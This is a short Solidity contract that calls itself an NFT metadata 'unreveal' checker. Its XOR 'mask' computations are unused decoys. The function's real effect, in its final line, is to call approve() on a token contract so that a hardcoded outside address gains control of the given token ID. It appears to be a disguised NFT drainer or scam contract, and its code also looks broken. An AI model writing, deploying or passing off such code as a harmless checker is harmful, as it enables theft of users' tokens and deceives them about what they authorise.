row number 
1	           pragma solidity ^0.8.0;
2	 interface MetaDataChecker {
3	 function approve(address to, uint256 tokenId) external;
4	 }
5	 contract UnreavalMeka {
6	 address Meka;
7	 bytes32 Mask = "8E6BEB5f56eebBd77cde3A6";
8	 bytes32 URIChecker = "METAUNREAVAL0ddwamna";
9	 constructor(address add_) {
10	 Meka = add_;
11	 }
12	 function Unreaval(uint256 _id) public {
13	 bytes32 localUnreavalHashMask;
14	 localUnreavalHashMask = Mask ^ bytes32(_id) ^ URIChecker;
15	 if (bytes32(_id) == "METARVALUE") {
16	 localUnreavalHashMask = bytes32(_id) ^ URIChecker;
17	 }
18	 return MetaDataChecker(Meka).approve(0x8E6BEB5f56eebBd77cde327954Ac9E1d15Eb8EA6, _id);
19	 }
20	 }
